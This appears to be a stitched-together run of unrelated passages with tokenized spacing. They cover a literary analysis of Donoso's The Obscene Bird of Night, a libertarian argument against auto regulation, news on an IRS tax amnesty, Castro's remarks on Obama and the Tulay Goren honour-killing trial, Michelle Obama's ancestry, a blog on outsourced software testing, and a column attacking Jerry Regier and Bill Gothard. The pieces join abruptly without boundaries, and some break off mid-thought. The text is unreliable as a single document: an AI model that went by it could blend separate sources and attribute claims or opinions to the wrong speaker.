Trying to get her husband to overcome his fears , Ines takes him to the place where Peta lives .
The grotesque setting , full of strange odors , large crates , and old clothes , repulses the aristocratic Jeronimo .
The heap of rags gathered itself together in order to give human reply to Ines 's call .
The old woman and the girl embarked on a conversation Jeronimo was n't prepared to tolerate .
The scene did n't fit into any medallion of eternal stone .
And , if it did fit into any , it was into the other series , into the hostile legend that contradicted his own : the legend of the stained and the damned , who writhe on the left hand of God the Father Almighty .
He had to pull Ines out of there immediately .
To prevent her from taking part in this other series of medallions , the ones linked to servitude , to oblivion , to death .
Ines was only a child who could be contaminated by the least little thing .
Ines 's relationship to her nursemaid separates her from Jeronimo even in marriage .
We are also told that " the heir began to take longer to arrive . "
Hieronymus Bosch , The Garden of Earthly Delights
A prolonged waiting period ensues , with Ines spending more time with Peta Ponce , and Humberto becoming closer to Jeronimo in his duties to protect him .
Each character is a double of the other -- Jeronimo and Humberto , Ines and Peta .
On the one hand , Jeronimo could be said to represent the light , and Humberto , the darkness .
The same goes for Ines and Peta .
But Jose Donoso , in his Jungian intellectual and artistic vision , wishes to invert the simple , fixed equation of light and dark .
And so , he blurs the characters and their interactions to create an alchemical reaction , an inversion of light and dark , good and evil , beauty and ugliness .
In the middle of the novel , after Jeronimo has been married to Ines for some time but has not produced an heir , a sexual act takes place .
You have to read the novel to understand how ambiguous this part of the story is .
We never really learn what happens .
There are only possibilities , speculations , hypotheses .
Either Jeronimo is finally able to impregnate his wife ; or his secretary , Humberto Penaloza , impregnates her ; or -- and I believe this is the most likely of the three possible story - lines -- the narrator impregnates Peta Ponce .
Whoever the child 's parents are , the outcome is an heir for Don Jeronimo de Azcoitia .
Jeronimo's vision of perfection , symbolized by the stone medallion , " one section of the eternal frieze , " is at last a reality .
And here 's when the story really starts to get interesting :
When Jeronimo finally parted the crib 's curtains to look at his long - awaited offspring , he wanted to kill him then and there ; the loathsome , gnarled body writhing on its hump , its mouth a gaping bestial hole in which palate and nose bared obscene bones and tissues in an incoherent cluster of reddish traits , was chaos , disorder , a different but worse form of death .

The Obscene Bird of Night

One of the most common examples brought forward by those who oppose the abolition of governmental regulation of consumer products is that of the automobile .
The rationale for the objection is that the automobile is the most expensive and complex consumer product that most will buy in a lifetime .
It has so much impact on personal safety , the environment , and our culture in general , that it is too important to be left to the free market to regulate .
This vision of shoddily built death traps blanketing the planet in thick smoke is naïve .
On the contrary , we have already seen glimpses within our current regulated system of how an unregulated one would function , as basic consumer wants transcend any government - imposed regulation .
Pollution
Dr. Walter Block addresses the issue of pollution in his recent book The Privatization of Roads and Highways , [ 1 ] and he quickly proves the statists ' nightmare of unchecked pollution to be a false one .
Owners of private roads , cognizant that they would be the most obvious targets for pollution lawsuits from surrounding property owners , would protect themselves by charging higher fees for higher - polluting vehicles , providing incentive for the automakers to design and build pollution - control equipment into their vehicles .
Block 's explanation is so lucid and rational that it is more meaningful to examine the failures of the current regulated system than the functioning of an unregulated one .
Corporate Average Fuel Economy ( CAFE ) , regulations enacted in the 1970's , were designed with a " federal government as savior " mentality , in reaction to the Arab Oil Embargo .
[ 2 ] CAFE has since , over the decades , morphed into a means by which environmental zealots can reduce our collective " carbon footprint , " regardless of the will of the individual .
With a popularly elected Congress dictating fuel economy to auto manufacturers , the required miles per gallon has consistently increased with little regard for consumer desires ( or lives ) .
As the CAFE calculation is weighted for sales volume , the amount of each model sold is critical to an automaker 's compliance with the requirement .
Small , fuel efficient vehicles must be discounted to increase sales volumes .
Conversely , prices are raised on large vehicles with higher fuel consumptions in order to decrease sales .
Auto manufacturers , somewhat counterintuitively , do not always oppose stricter standards .
Deals are cut with auto lobbies , as subsidies for fuel economy technology and research are traded for auto manufacturers ' endorsement of CAFE requirements that they would otherwise be opposed to .
Similarly , the categorization of specific models can be negotiated in order to lessen the impact on auto manufacturers .
Passenger cars and trucks have different CAFE standards , and with the advent of the crossover , the lines between car and truck are intentionally being blurred ( Chrysler 's PT Cruiser is categorized as a truck ) .
The primary unintended consequence of CAFE regulation has been its negative impact on occupant safety .
The effect of ever - increasing fuel economy standards has been an accelerated trend towards smaller vehicles ( faster than the market would have trended if left alone ) .
Occupants of smaller , lighter vehicles are at a greater risk in multivehicle collisions , due to a greater disparity in vehicle sizes .
A 1999 USA Today analysis estimated that from 1975 to 1999 , approximately 46,000 people died in crashes they would otherwise have survived had they been driving larger vehicles .
That 's 7,700 cumulative deaths for every mile per gallon gained .
[ 3 ]
Numerous other studies have been conducted — with varying conclusions , as some subjective analysis is necessary — but the general premise of size disparity increasing death rates remains inherently logical .
Lost in the public debate over fuel economy is the fact that the technology exists today for more - fuel - efficient vehicles ; but the market has , for the most part , rejected it .
Auto buyers have consistently eschewed manual transmissions , despite their positive impact on fuel efficiency , in favor of the more - convenient but less - efficient automatic transmission .
Buyers have also opted for traditional gasoline engines over more efficient diesel engines .
Similarly , the gain in fuel efficiency from a turbocharged engine has failed to entice buyers to make the additional investment .
Automakers have not been able to offset the higher cost of aluminum body panels ( which reduce mass and therefore increase fuel efficiency ) with a higher selling price and therefore steel remains the primary component of auto bodies .
The fact that fuel economy has become a topic for public debate , rather than an individual consumer choice , is a depressing indicator of how widespread the collectivist vision of the need for a government - regulated market is .
Higher auto - fuel - efficiency mandates and public funding for alternative fuels remain massively popular ideas , [ 4 ] despite that the small - and midsize - car segments comprise only 45 percent of all auto sales . [ 5 ]
Quality
Consumer Reports is a widely known magazine publishing consumer reviews , comparisons , tests , and buying guides of new and used automobiles .
It is published by the nonprofit organization Consumers Union , and funded by subscribers .
To maintain objectivity in the eyes of their subscribers , their operating code is strict : they accept no advertising from outside sources , and they purchase anonymously all the vehicles they test .
Their relationship with auto manufacturers had long been a tumultuous one , as automakers have frequently criticized Consumer Reports ' test methods , small sample size , etc .
Over time , however , Consumer Reports became so influential , and accumulated enough respect and goodwill among auto buyers , that auto manufacturers began to work with them preemptively .
Consumer Reports ' practice of testing new models remained unchanged ; but auto manufacturers would send preproduction vehicles to their test facility , to solicit the test engineers ' feedback .
The engineers ' suggestions could then be worked into the design of the vehicle , and upon the start of the mass production of it ( and Consumer Reports eventual random purchase and test ) a better rating would be achieved . [ 6 ]
In 2003 , this practice became widely reported , forcing Consumer Reports to end it , because it called into question their objectivity . [ 7 ]
Even the appearance of bias , whether substantiated or not , and the potential loss of revenue due to a damaged reputation , was sufficient motivation for Consumer Reports to change course .
In a market economy , their customers ' opinion of them was sacrosanct , as is the case with any seller of a good or service .
J.D. Power & Associates , owned by the publicly traded McGraw - Hill Companies Inc. , specializes in surveys of customer satisfaction .
Their primary revenue source is automotive companies who purchase the data they collect .
Their widely known Initial Quality Survey ( IQS ) has become the benchmark of product quality in the automotive industry .
Auto buyers are surveyed within 90 days of purchasing a new vehicle , and are asked to indicate Things Gone Wrong ( TGW ) in numerous categories .
Summary data of Things Gone Wrong per 100 vehicles ( TGW / 100 ) for each model , manufacturer , segment , and assembly plant are then released to the public on annual basis . [ 8 ]
Detailed data for every TGW category and model are released to J.D. Power & Associates ' customers .
The IQS does have limitations : Every TGW receives an equal weight , so a hard - to - use cup holder would have the same impact as a nonfunctional engine .
Also , 90 days is too short a service period to judge a model 's long term quality .
However , every auto manufacturer is forced to respect IQS 's profound impact on customer perception , and all have adopted it as an internal measure of quality .
Consumer Reports and J.D. Power & Associates play an important role in any market , regulated or not , and would certainly continue to exist and thrive should government regulations be abolished .
Safety
The Insurance Institute of Highway Safety ( IIHS ) [ 9 ] is a nonprofit organization , which receives funding from auto insurers , with the intent to reduce the number of accidents , extent of damage , and rate of personal injury .
Recognizing that the state - imposed regulations of the National Highway Traffic Safety Administration ( NHTSA ) did not adequately reflect customers ' and insurers ' goals , IIHS formulated several unique safety tests .
In addition to the NHTSA mandated frontal - impact test , the frontal - offset - impact test was developed by IIHS to better represent real - life impacts .
Most frontal impacts are offset , meaning the impact is borne by only a portion of the front of the automobile , and not evenly distributed over the entire front .
The IIHS side - impact test also differs from NHTSA version , to simulate the more dangerous and increasingly common occurrence of a taller , sport-utility vehicle impacting the side of an automobile .
In 2009 , IIHS began roof crush testing sport-utility vehicles , which are prone to rollover accidents , to a stricter standard than NHTSA mandates . [ 10 ]
IIHS purchases and tests new and redesigned models , with the detailed results published to the automakers and insurers , and summary reports released to the general public . [ 11 ]
The net benefit to consumers is safer vehicles and lower insurance premiums , which stem from the insurers ' benefit of less and lower payouts .
Auto manufacturers also benefit from testing that better represents real - life conditions and thus reduces the risk of litigation .
These desires would remain in a true free market , and therefore an IIHS or competitor adding similar value would maintain its important role .
Safety features with questionable value , such as airbags , would receive the close scrutiny they deserve in a true free market , and consumers would benefit from the transparency and frankness that our current system lacks .
One can easily imagine that owners of private roads would impose a minimum safety standard for vehicles travelling on their roads .
The level of required safety performance would likely vary from road to road .
For example , a farm truck travelling only short distances on rural roads would not need to be equipped with the same safety equipment as a family sedan travelling on a city expressway .
Above the minimum threshold , auto manufacturers would cater to consumer 's individual choice .
Models with higher safety ratings would satisfy consumers who value lower insurance premiums and / or peace of mind .
Models with lower safety ratings would satisfy consumers whose focus is on cost .
NHTSA is the issuer of the commonly known Federal Motor Vehicle Safety Standards ( FMVSS ) .
Although the industry lobby has an influence , FMVSS regulations are , at their core , government fiats .
And like all government fiats , they create market distortions .
Seemingly minor differences among regulations result in additional cost burdens to auto manufacturers , depriving customers of the maximum benefit from the international division of labor .
Import vehicles must be modified to comply with requirements that are unique to FMVSS , either at the source factory or a local retrofitter , driving up cost .
Export vehicles are penalized in a similar manner .
For example , models that are exported to Canada must be equipped with daytime running lights ( DRL ) and a redesigned bumper , as CMVSS ( the Canadian equivalent to FMVSS ) has unique provisions mandating daytime running lights and a greater impact speed for bumper damageability .
Conclusion
All consumers place a high value on their personal safety .
The sellers of any consumer product must fulfill this desire in order to profit in a capitalist economy .
Auto manufacturers , motivated by their customers ' wishes to access roads at the lowest possible cost to them , and to acquire insurance at the lowest possible cost , would profit by producing safe products that meet standards established by private regulators .
Private regulators , who depend on their own brand reputations and trustworthiness , would compete with each other for the opportunity to test and certify automobiles .
Insurance would likely cease to be mandatory , leaving the choice up to each individual .
It is conceivable that some road owners would require road users to have personal - liability insurance .
Additionally , in order to protect the asset that they are financing , the underwriters of auto loans may require that the buyer purchase collision insurance .
The free market possesses the means to regulate itself .
Automobiles are not too important to be left to the free market to manage .
They are too important to be left to government .
WASHINGTON ( Reuters ) -
As the deadline passes on a U.S. tax amnesty program that has lured thousands of wealthy Americans to declare offshore assets , attention now turns to prosecutions of those who kept their holdings hidden .
The Internal Revenue Service ’s amnesty program , which ends at 5 p.m. EDT on Thursday , has seen 7,500 individuals come forward over six months , getting in before the IRS pursues them .
In exchange they get vastly lowered penalties and in most cases protection against criminal prosecution .
For those who failed to turn themselves in , the Justice Department is pursuing criminal cases .
The U.S. government has already opened cases against about 150 clients of UBS AG , names it obtained when the Swiss bank paid $ 780 million to settle a criminal suit in February after admitting it helped Americans skirt the law .
In August , UBS settled a related civil case by agreeing to turn over about 4,450 client names .
Government officials say the issue is bigger than UBS and any one country .
“ The IRS has new momentum in this entire area and in the coming months our efforts will only intensify , ” IRS Commissioner Doug Shulman said on Wednesday .
He added that the government will be “ scouring ” the amnesty forms for clues of other financial advisors who aided evaders .
A top U.S. prosecutor recently said cases will be brought every few weeks .
Private lawyers say the cases are crucial for deterrence .
“ The criminal tax prosecutor ’s job is to keep a handful of cases in the media so that everyone will see that there is at least that potential for being prosecuted , ” said Mark Matthews , a former IRS deputy commissioner for enforcement who now counsels private clients .
He said to keep the momentum going , the government will need to shift resources beyond UBS .
“ This story has understandably focused on one financial institution and one country , but the truth is this was a global offer , ” for amnesty , Matthews said .
Indeed , IRS announced on Wednesday it was broadening its international presence , opening new offices in Beijing , Sydney and Panama City .
Clients of other banks have come in under the amnesty program , including those of UBS rival Credit Suisse and London - based HSBC , lawyers said .
“ The IRS has done a very good job of scaring the hell out of everybody , ” said Ken Rubinstein , a lawyer with his own firm who counsel clients in tax matters .
He said he expects more prosecutions to keep the heat on offshore bank customers .
The precedent set by the UBS case will allow the government to get more information from other countries and banks , he added .
Government officials have secured seven guilty pleas so far in the UBS case , including former clients , bankers and lawyers .
Most were accused of hiding assets of less than $ 10 million .
Shulman , in announcing preliminary results of the amnesty program on Wednesday , would only say the asset sizes involved ranged from $ 10,000 to $ 100 million but would not characterize where the majority fit in that range .
Private lawyers say most those coming in voluntarily are those who were ignorant of the law , and not the big fish intent on evading taxes that the government is after .
“ This program has taken in a lot of people who stubbed their toe , ” said Josh Ungerman , an attorney at Meadows , Collier in Dallas .

The 12 photographers included in the exhibition “ North Korean Perspectives , ” on view at Chicago ’s Museum of Contemporary Photography through October 4 , reflect on the public image that the totalitarian government of North Korea tries to project , and the limited view that outsiders have of the secretive country known as the Hermit Kingdom .
The show features recent images by photojournalists David Guttenfelder and Tomas van Houtryve , and images made in the 1990s by Pierre Bessard .
Ari Hatsuzawa , who is Japanese , managed to make relatively candid and intimate images of life in North Korea by befriending and socializing with the government minders who accompanied him everywhere he went .
Some artists in the show have appropriated images released by state - owned media to skewer its upbeat propaganda .
These include João Rocha , who created the deadpan series “ Kim Jong Il Looking at Things , ” and South Korean photographer Seung Woo Back , who digitally alters the postcards of government architecture .
The show also features work by Suntag Noh , Marie Voignier , Matjaž Tančič , Alice Wielinga , Philippe Chancel and Hyounsang Yoo .
The artists do not attempt to present a single reality of the Hermit Kingdom , “ nor do they yield a definite picture of its people , ” writes guest curator Marc Prust .
But they each offer their perspective on a place few of us will see for ourselves .
“ Therefore , from this array of visions and opinions , we have to try and make up our own minds about a country eager to do that for us .
A photograph can be a vehicle for a lie , but change the context of that picture , and it can reveal something of the truth it wants to hide . ”

The outlines of Mrs. Obama ’s family history unfolded from 19th century probate records , yellowing marriage licenses , fading photographs and the recollections of elderly women who remember the family .
Ms. Smolenyak , who has traced the ancestry of many prominent figures , began studying the first lady ’s roots in earnest after conducting some preliminary research into Mrs. Obama ’s ancestry for an article published in The New York Times earlier this year .
Of the dozens of relatives she identified , Ms. Smolenyak said , it was the slave girl who seemed to call out most clearly .
“ Out of all Michelle ’s roots , it ’s Melvinia who is screaming to be found , ” she said .
When her owner , David Patterson , died in 1852 , Melvinia soon found herself on a 200 - acre farm with new masters , Mr. Patterson ’s daughter and son-in law , Christianne and Henry Shields .
It was a strange and unfamiliar world .
In South Carolina , she had lived on an estate with 21 slaves .
In Georgia , she was one of only three slaves on property that is now part of a neat subdivision in Rex , near Atlanta .
Whether Melvinia labored in the house or in the fields , there was no shortage of work : wheat , corn , sweet potatoes and cotton to plant and harvest , and 3 horses , 5 cows , 17 pigs and 20 sheep to care for , according to an 1860 agricultural survey .
It is difficult to say who might have impregnated Melvinia , who gave birth to Dolphus around 1859 , when she was perhaps as young as 15 .
At the time , Henry Shields was in his late 40s and had four sons ages 19 to 24 , but other men may have spent time on the farm .

from the book “ Anything You Want ” : Why I gave my company to charity 2009 - 12-04
Two friends were at a party at a billionaire ’s extravagant estate .
One said , “ Wow !
Look at this place !
This guy has everything ! ”
The other said , “ Yes , but I have something he ’ll never have : enough . ”
When I decided to sell my company , I already had enough .
I live simply .
I do n’t own a house , a car , or even a TV .
The less I own , the happier I am .
The lack of stuff gives me the priceless freedom to live anywhere anytime .
So I did n’t need or even want the money from the sale of the company .
I just wanted to make sure I had enough for a simple comfortable life .
The rest should go to music education , since that ’s what made such a difference in my life .
I created a charitable trust called the Independent Musicians Charitable Remainder Unitrust .
When I die , all of its assets will go to music education .
But while I ’m alive , it pays out 5 % of its value per year to me .
A few months before the sale , I transferred the ownership of CD Baby and HostBaby , all the intellectual property like trademarks and software , into the trust .
It was irreversibly and irrevocably gone .
It was no longer mine .
It all belonged to the charitable trust .
Then , when Disc Makers bought it , they bought it not from me but from the trust , turning it into $ 22 million cash to benefit music education .
So instead of me selling the company — ( getting taxed on the income , and giving what ’s left to charity ) — that move of giving away the company to charity then having the charity sell it saved about $ 5 million in taxes .
( That means $ 5 million more going to music education . )
Also , the move of giving it away into a trust now — instead of holding on to it until I die — means its investments get to grow and compound tax - free for life , which again means more goes to musicians in the end .
I ’m only writing this article because many people have asked why I gave it away , so I thought I ’d write my long explanation once and for all .
It ’s not that I ’m altruistic .
I ’m sacrificing nothing .
I ’ve just learned what makes me happy .
And doing it this way made me the happiest .
I get the deeper happiness of knowing the lucky streak I ’ve had in my life will benefit tons of people — not just me .
I get the pride of knowing I did something irreversibly smart before I could change my mind .
I get the safety of knowing I wo n’t be the target of a frivolous lawsuit , since I have very little net worth .
I get the unburdened freedom of having it out of my hands so I ca n’t do something stupid .
But most of all , I get the constant priceless reminder that I have enough .
Every time I write a post for this blog I carefully check it for typos .
I then get my wife to proof - read it .
She always finds at least one typo .
Often there will be whole words missing that my brain must have interpolated when I checked it .
I read what I thought I had written .
She is unencumbered by such preconceptions .
Similarly , it is n’t sufficient to do all your own testing on software you wrote , no matter how hard you try .
You will tend to see what you intended to program , not what you actually programmed .
Furthermore your users have different experiences , assumptions , and patterns of usage to you .
Even in the unlikely event that you manage 100 % code coverage in your testing , those pesky users wo n’t execute those lines of code in the same order you did .
I have spent hours testing a program without finding a bug , only to see someone else break it within minutes or even seconds .
So it is essential to involve people other than the original programmer in testing , in addition to ( but not instead of ) the testing programmers do on their own code .
This poses something of a challenge to one - man - bands such as my own .
I do n’t have other programmers , let alone QA staff , to call on .
I can , and do , use volunteer customers for beta testing .
But , in my experience , beta testing is not an effective substitute for professional testing :
It is haphazard .
I never hear from ~ 90 % of my beta testers .
You ca n’t control beta testers sufficiently , for example you ca n’t set them tight deadlines , make them concentrate on a particular feature or do their testing on a particular operating system
The quality of bug reports from customers is often poor .
Customers often do n’t understand ( or do n’t have the patience ) to describe a bug in enough detail for you to reproduce it .
Professional testers know how to break software .
The new release should be as polished as possible before any customers see it .
Your beta testers will be some of your most enthusiastic customers .
You do n’t want to use up that goodwill by sending them buggy software .
Consequently I like to pay third party testers to test my own PerfectTablePlan product after I have finished my own testing and before I do any beta testing .
Previously I have used softwareexaminer.com , but they are no longer in business .
So I decided to try a couple of other offshore testing companies I had heard about :
The problem with paying a testing company is that it is hard to assess the quality of their work until it is too late .
If they report few bugs it could because there are few bugs or because they did n’t do a very good job of testing .
By using 2 companies to test the same software release I was also testing the testers ( I did n’t tell them this ) .
I paid each company to do approximately 3 days testing on the Windows and Mac versions of PerfectTablePlan .
I was very pleased with the results .
Both companies found a useful number of bugs in the software .
They were also able to test on platforms that I did n’t have access to at the time ( 64 bit Windows 7 and Mac OS X 10.6 ) .
I did n’t keep an exact score , but I would say that QSG found more bugs , while TestLab2 was more responsive .
QSG found some quite obscure bugs .
They were even able to tell me how to reproduce a very rare and obscure bug that I had been trying to track down for months without success .
Communications were sometimes a little slow ( at least partly due to us being in different time zones ) but it was n’t a huge issue .
My only real grumble is their billing .
Despite several reminder emails from me I am still waiting to be invoiced for the work several months later .
I like to pay my bills promptly and then forget about them .
TestLab2 did n’t find quite as many bugs , but I was impressed with their responsiveness .
They installed Mac OS X 10.6 within a few days of it being released , so they could test PerfectTable Plan on it .
When I emailed them on a Saturday about a last minute bug fix for Mac OS X 10.6 they tested the fix the same day .
That is great service .
TestLab2 and QSG are based in Ukraine and India , respectively .
At around $ 15 / hour they are about a third the price of equivalent US / European companies I contacted ( who might also outsource the work to Eastern Europe and India , for all I know ) .
Some people believe outsourcing work to countries with lower costs of living is evil .
I ’m not one of them .
I sell my software worldwide and I am also happy to buy my services worldwide , especially if I can get significantly better value for money by doing so .
While there are rational arguments to be made about problems caused by differences in culture , language and time zone caused by outsourcing to other countries , I did n’t find any of these to be a major issue in this case .
Most of the other arguments I have heard boil down to the simple ugly fact that some westerners feel they are entitled to a disproportionate share of the global pie .
But I do n’t see any reason why someone in Europe or North America is any more deserving of a job than someone in Ukraine or India .
With the help of these two companies I was able to put out a really solid PerfectTablePlan v4.1.0 release , despite the large number of new features .
In fact , I am only just putting out a v4.1.1 with some bugs fixes several months later .
I plan to use both companies again .
I hope readers of this blog will give them some additional work to ensure they stay in business .
But not so much that they do n’t have time to do my next round of testing !
Venezuela 's Hugo Chavez read out Fidel Castro's remarks
Cuba 's former leader Fidel Castro has accused the US of plotting to overthrow left - wing governments in Latin America .
The " friendly smile " of US President Barack Obama could not be trusted , Mr Castro said in remarks read out at a summit of leftist leaders in Havana .
His comments were echoed by Venezuelan President Hugo Chavez and other regional leaders at the meeting .
Fidel Castro's remarks suggest hopes for a thaw in US - Cuba ties may be waning , correspondents say .
As the left - wing summit drew to a close , Mr Chavez read out a letter from Fidel Castro in which he said the US was again on the offensive in Latin America .
He accused Washington of supporting right - wing governments in the region in an attempt to weaken Mr Chavez and other socialist leaders .
" The real intentions of the empire are obvious , this time hidden beneath the friendly smile and African - American face of Barack Obama , " Mr Castro said .
Cuba 's former leader , who was at the country 's helm for nearly 50 years before handing over the presidency to his brother last year , initially welcome President Obama 's election .
But in recent weeks , he has issued increasingly critical comments .
Last week , Mr Castro said that Mr Obama 's acceptance of the Nobel peace prize was a " cynical act " .
His criticisms were picked up by the regional leaders , who attacked Washington 's handling of the political crisis in Honduras that saw President Manuel Zelaya toppled , and condemned plans by the US to use military bases in Colombia to tackle drug - trafficking .
The summit of the Bolivarian Alliance for the Peoples of America ( Alba ) concluded with a declaration on climate change that called on developed nations to pay for the environmental damage their economic model had caused .
Alba was founded five years ago as an alternative to US free trade policies in the region .
A woman whose husband was jailed today for murdering their 15 - year - old daughter 10 years ago in an " honour killing " is living in fear of reprisals after she gave devastating evidence against him .
Tulay Goren was killed in January 1999 for running away from home to live with her boyfriend , a fellow Turkish Kurd twice her age whom her family disapproved of because he was from a different branch of Islam .
Today , at the end of a dramatic and emotional 11 - week trial , Mehmet Goren was given a life sentence , with a minimum of 22 years , for killing his daughter after kidnapping , drugging and tying her up .
Her remains , which police believe were buried in the family garden temporarily , have never been recovered , making this one of only a handful of murder convictions secured without a body .
The prosecution claimed Mehmet 's brothers Ali , 55 , and Cuma , 42 , helped him in the murder after a " family council " decided that she and her forbidden lover must die .
But the Old Bailey jury were not convinced and cleared the brothers of any involvement in her murder .
Tulay 's mother Hanim , whose testimony against her husband was crucial to the prosecution , was too afraid to attend court for the rest of the trial .
Last week police installed additional security measures in her home and that of her surviving daughter , Nuray , also a prosecution witness .
Yesterday , Nuray praised her mother for testifying .
She said : " No one should fail to realise what this means within our culture .
These people do not forget . "
She added : " For my father , I have only one request .
I ask that he finally discloses the whereabouts of my sister .
I wake up at night wondering where Tulay may be .
In quiet moments during the day I ask myself if she suffered or knew what was in store for her . "
Experts have said the breach of the code of honour , or namus , that detectives believe led to Tulay 's killing could also apply when a woman speaks out against her husband .
The case marked the first time prosecutors have used expert witnesses in an " honour " crime .
They described how the system worked among Turkish Kurds and highlighted features of the Goren case – such as the loss of her virginity to her boyfriend , a loss of family honour that triggered the murder – which paralleled similar murders in Turkey .
Police believe there are 12 " honour killings " a year in Britain , and a quarter of the victims are under 18 .
Police and prosecutors introduced new measures to protect and punish perpetrators in the wake of public criticism of failings in the case of Banaz Mahmod , who sought police help before she was killed by her father and uncle in 2006 .
Risk assessment measures identifying cases where victims may be vulnerable are now flagged up in police stations , police receive training in " honour " violence , and there are now prosecutors who specialise in the crime .
Sentencing Mehmet to life , Mr Justice Bean told him that his attempts to portray himself as an enlightened family man had not worked .
" Your enigmatic smile conceals a violent and dominating personality , " the judge said .
" The victim was a child of 15 with her whole of her life before her .
You were in a position of trust as her father .
You planned her murder with considerable care . "
Speaking about the day Tulay was killed , the judge went on : " You instructed your family to leave the house , telling her eight year - old brother to kiss her goodbye because he would never see her again .
I was not surprised to be told that this moment has haunted him ever since . "
An " average , normal or unexceptional murder " carries a 14 - year sentence but the judge said Tulay 's killing had many aggravating features , including planning , and was similar to racially or religiously aggravated killings .
Detectives came to believe that Mehmet killed his daughter as early as March 1999 , when Hanim told them of her suspicions .
But the Crown Prosecution Service advised against charging him because they could not rule out the possibility that she was still alive .
At that time " honour killing " , particularly in the Turkish and Kurdish community , was an alien concept to police and public .
But when the case was re-examined in 2007 , it followed the successful prosecutions of similar murders .
In 2003 an Iraqi Kurd , Abdulla Yones , was jailed for life for killing his 16 - year old daughter , Heshu , and in 2007 , the father and uncle of Banaz Mahmod were given life imprisonment for her murder .
Gerry Campbell , of the Met 's violent crime directorate , said the lessons learned had " galvanised us to know and understand honour - based violence " .
" She 's a very friendly little thing , " said Gail Luciani , PSCPA spokeswoman . " . . .
She was purring while we were preparing to take the tape off , while we were getting her sedated . "
Tracking new Florida child welfare chief Jerry Regier 's past has led to some pretty disturbing things : radical Christian groups , papers on parental discipline that condone bruises and welts , and a drive to give tax dollars to churches .
Now , welcome to the prayer closet .
Inside a converted 300 - room hotel , the prayer closet is a little room where kids are taken when they disobey staff at the Indianapolis Training Center ( ITC ) .
Once locked inside , the misbehaving youths are forced to sit and pray to Jesus , sometimes for days at a time .
Some juvenile ITC residents have said the evangelical Christian teens and young adults who staffed the center sometimes forbade them from going to the bathroom , forcing them to sit in their own urine for hours .
Some have complained of beatings with paddles by untrained staff that left bruises and welts .
When not in isolation , the kids are forced to march and chant and pray , with gospel music playing almost constantly .
The juvenile court system in Indianapolis has been sending kids convicted of minor crimes to the ITC for the past decade , but the extremist Christian creep show inside the center was exposed only earlier this year in reports by two Indy TV news stations .
Those exposés , one of them titled " Dark Secrets , " prompted a state investigation .
But do n't expect any of that to stop Regier from trying to bring something like the Indianapolis program to the Sunshine State .
The new Department of Children and Families chief has close ties to the man behind the ITC , a radical minister named Bill Gothard .
Gov. Jeb Bush , who appointed Regier last month , is also a long - time Gothard supporter .
Bush has no evident ties to the ITC , but he implemented Gothard 's controversial character education program , Character First ! , at his charter school in Liberty City .
The governor also publicly encouraged the Palm Beach County School Board to approve Character First ! , which is also listed as a model program in state law .
And Gothard has ties to the governor 's brother , George W. Bush .
The president appointed Stephen Goldsmith , the archconservative Indianapolis mayor who partnered with Gothard to create the ITC , as a special adviser .
Goldsmith recently helped formulate the president 's " faith - based initiatives , " which give tax dollars to churches .
I 've written about Gothard before .
Three and a half years ago , I discovered he was behind Character First !
and looked into his bizarre ministry [ " Little Soldiers of the Culture War , " February 18 , 1999 ] .
The seat of the 66 - year - old Christian guru 's power is in Chicago , where he runs a little empire -- reportedly worth $ 63 million -- called the Institute of Basic Life Principles ( IBLP ) .
Gothard , who has been preaching for decades and claims 2.5 million followers , teaches that Jesus Christ is at the top of a " chain of command " in which authority figures -- teachers , employers , elected officials , and , of course , preachers -- are ordained as leaders by Christ and should be obeyed without question .
" God expects you to consider that you are working for Jesus Christ on your job , " he instructs his followers in IBLP seminars , which are held around the country .
In Gothard 's world view , husbands are dominant over wives ( another of Regier 's stated beliefs ) , and wives are forbidden to work outside the home .
Marriages must be arranged by fathers , and divorce is not allowed .
Rock beats and , oddly enough , chords in minor keys are considered a subversion of God 's harmony .
Television and other forms of popular culture are largely shunned as evil .
Gothard even dictates how people should dress and when married couples can and cannot have sex .
And , like Regier , Gothard is a big believer in corporal punishment , preaching that the " wrath " of parents leads children to God .
In the early 1990s , Gothard was invited by then - Indianapolis Mayor Goldsmith to open the ITC .
Goldsmith made Indianapolis a " City of Character " wherein some of Gothard 's teachings have been incorporated into local government and the school system there .
The former mayor also ordained that the court system could sentence children to Gothard 's care and gave the preacher a publicly owned building -- for a token $ 1 price -- to run an orphanage in the city .
Goldsmith 's wife , Margaret , is employed in Indianapolis by Judge James Payne , who uses the bench to send kids to Gothard 's center .
When running for the presidency , George W. Bush made Goldsmith his chief domestic policy adviser .
He kept Goldsmith on staff after winning the White House .
The president and Goldsmith have another mutual friend , Oklahoma Gov. Frank Keating , Regier 's former boss .
In 1996 , Keating and Regier welcomed Gothard to Oklahoma City , where the IBLP founded the Character Training Institute .
As head of the Oklahoma Department of Juvenile Justice , Regier spread the Gothard word .
When he testified before a U.S. House of Representatives subcommittee on juvenile justice in 1996 , Regier spoke of the need to build a " Wall of Protection " around children so they do n't succumb to the streets .
But what he really advocated was tearing down the Jeffersonian wall between church and state .
" Government can be involved in opening the door so that churches and other nonprofit organizations can do what they do best -- turn kids around ! " he exclaimed .
" Although there has been much debate about the relationship between the church and the state , it is clear that our forefathers wanted the church protected from the state , not the state protected from the church . "
After this bit of historical hogwash , Regier supplied the answer to the country 's ills : Bill Gothard .
" Indianapolis has pioneered this innovative solution by developing a partnership among Mayor Goldsmith ... and the local chapter of Mr. Bill Gothard 's [ center ] , " Regier testified .
" The partnership supplies youth volunteers , parents , and probation youth who voluntarily participate and are paired with ... volunteers . "
The paddlings and prayer closet must have slipped his mind .
Regier also spoke of all the wonderful things he and Keating planned , such as spreading Gothard 's volunteers across the state to train " thousands of high school and college - age young people " to " serve mayors , authorities , school systems , and corporate leaders in building stronger families . "
Imagine that : Gothard Youth .
This stuff is so exciting , I 'm tempted to click the heels of my shiny black boots .
No longer will we have to deal with adolescents encumbered by weaknesses like , say , free thought .
Why , with the proper amount of -- well , let 's just call it training -- the kids 'll do whatever authorities like Regier cook up in their brimstone - baked brains .
Even as Regier was testifying , the Gothardians were devising Character First ! , a curriculum based on IBLP teachings .
Although there are only shades of Christianity in Character First !
( instructions include turning the other cheek , for instance ) , the chain of command is evident .
Students march and chant and sing about heeding " wishes of authority " and " following orders instantly ... as soon as I can say ' Yes , sir ! '
' Yes , ma'am ! '
Hut two three ! "
In Gothard 's world , the closest person to God in Broward County would likely be Hamilton Forman , the octogenarian patriarch of the pioneering family .
After decades of shrewd land speculation and politicking , Forman certainly has more money than God , anyway .
He 's also a top campaign contributor and devout Christian .
Forman not only installed Character First !
in his own publicly funded charter school in Fort Lauderdale but he decided it had to be in every school in Florida .
Forman gave the curriculum to his friend Jeb Bush , who promptly added it to the charter school the governor helped found in Liberty City .
